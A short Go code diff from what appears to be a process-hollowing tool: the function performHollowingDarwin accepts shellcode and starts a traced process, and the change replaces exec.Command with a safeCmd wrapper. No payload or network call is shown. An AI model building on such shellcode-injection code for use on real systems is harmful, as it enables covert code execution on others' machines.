@@ -6,7 +6,6 @@ import (
 	"encoding/base64"
 	"fmt"
 	"os"
-	"os/exec"
 	"runtime"
 	"strings"
 	"syscall"
@@ -92,7 +91,7 @@ func performHollowingDarwin(shellcode []byte, params hollowParams) (string, erro
 		args = []string{"86400"}
 	}
 
-	cmd := exec.Command(parts[0], args...)
+	cmd := safeCmd(parts[0], args...)
 	cmd.SysProcAttr = &syscall.SysProcAttr{
 		Ptrace: true,
 	}
